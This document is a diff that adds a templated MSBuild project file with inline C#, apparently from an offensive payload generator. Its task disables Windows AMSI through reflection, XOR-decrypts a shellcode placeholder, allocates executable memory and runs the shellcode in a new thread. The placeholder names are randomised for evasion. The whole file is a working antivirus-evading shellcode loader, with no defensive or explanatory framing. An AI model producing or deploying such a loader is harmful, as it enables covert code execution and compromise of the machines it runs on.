@@ -1,0 +1,72 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="{{ v.target_name }}">
+    <{{ v.task_name }} />
+  </Target>
+
+  <UsingTask
+    TaskName="{{ v.task_name }}"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup />
+    <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Runtime.InteropServices" />
+      <Using Namespace="System" />
+      <Using Namespace="System.Runtime.InteropServices" />
+      <Using Namespace="System.Reflection" />
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.IO;
+        using System.Net;
+        using System.Reflection;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class {{ v.task_name }} : Task, ITask {
+            [DllImport("kernel32")] static extern IntPtr {{ v.fn_valloc }}(IntPtr a, uint s, uint t, uint p);
+            [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint flags, IntPtr id);
+            [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+            static void {{ v.fn_amsi }}() {
+                try {
+                    var t = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
+                    if (t != null) {
+                        var f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                        if (f != null) f.SetValue(null, true);
+                    }
+                } catch {}
+            }
+
+            static byte[] {{ v.fn_decrypt }}(byte[] data, byte[] key) {
+                var o = new byte[data.Length];
+                for (int i = 0; i < data.Length; i++) o[i] = (byte)(data[i] ^ key[i % key.Length]);
+                return o;
+            }
+
+            static byte[] {{ v.fn_hex }}(string h) {
+                var b = new byte[h.Length / 2];
+                for (int i = 0; i < b.Length; i++)
+                    b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
+                return b;
+            }
+
+            public override bool Execute() {
+                {{ v.fn_amsi }}();
+
+                byte[] sc  = {{ v.fn_decrypt }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
+                                              {{ v.fn_hex }}("{{ key_hex }}"));
+
+                IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
+                Marshal.Copy(sc, 0, mem, sc.Length);
+                IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+                WaitForSingleObject(h, 0xFFFFFFFF);
+                return true;
+            }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
